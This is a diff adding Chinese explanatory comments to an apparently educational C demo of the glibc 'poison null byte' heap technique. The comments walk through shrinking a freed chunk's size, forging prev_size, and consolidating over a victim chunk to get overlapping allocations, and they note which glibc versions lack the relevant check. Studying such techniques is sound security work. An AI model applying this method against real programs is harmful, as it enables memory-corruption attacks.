@@ -55,6 +55,7 @@ int main()
 		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
 	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
 	// which is the value of b.size after its first byte has been overwritten with a NULL byte
+	//* 提前修改chunkB size域改动后next_chunk(chunkB)处的prev_size
 	*(size_t*)(b+0x1f0) = 0x200;
 
 	// this technique works by overwriting the size metadata of a free chunk
@@ -64,6 +65,13 @@ int main()
 	printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
 	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
 	//模拟chunk a溢出一个null byte，淹没了chunk b的prev_inuse位
+//! chunkB处于free状态时改动其size字段的最后1byte，减小chunk size
+	//* 此时chunk位于unsorted bin中，更改size不会引发错误
+	//* 结合之前构造的fake prev_size，完成了chunkB的缩小，便于后方利用
+	//* 此时通过不同的方式访问chunkB会得到不同的结果
+		//* 直接访问chunkB得到的size为0x200,且此时chunkB处于free状态，故所有基于chunkB的分配操作都是直接访问chunkB的
+		//* 释放chunkC时，在前向合并流程中会通过prev_size字段访问chunkB，由于之前chunkB区域被人为修改，所有对chunkB
+			//* 作出的操作都无法反映到chunkC的prev_size上，则通过chunkC访问的chunkB依然是原本的chunkB
 	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
 	printf("b.size: %#lx\n", *b_size_ptr);
 
@@ -79,6 +87,8 @@ int main()
 	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
 	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
 		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
+	//* 分配新chunk时，无法直接在相应的bin中找到，则先清理unsorted bin中的chunk到相应的bin中，chunkB对应的bin为其人为改动后的size对应的bin
+	//* 无法通过best-fit原则找到对应chunk，通过bitmap找到chunkB，切割其前半部分
 	b1 = malloc(0x100);
 
 	printf("b1: %p\n",b1);
@@ -88,7 +98,8 @@ int main()
 		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
 	printf("We malloc 'b2', our 'victim' chunk.\n");
 	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
-
+	
+	//*再次切割chunkB 
 	b2 = malloc(0x80);
 	printf("b2: %p\n",b2);
 
@@ -96,7 +107,11 @@ int main()
 	printf("Current b2 content:\n%s\n",b2);
 
 	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
-
+	
+	//* 此时chunkC的prev chunk仍然为紧接着chunkA后方的原chunkB开头处，此时此位置为b1
+	//* 释放b1的情况下再释放C,此时b1位于chunkC - chunkC->prev_size处
+	//* 绕过对C进行前向合并时对前方chunk的检测 : chunk->bk->fd == chunk && chunk->fd->bk == chunk
+	//* glibc 2.23版本中不存在size & prev_size对应检测,此检测在glibc >= 2.26时生效
 	free(b1);
 	free(c);
 	
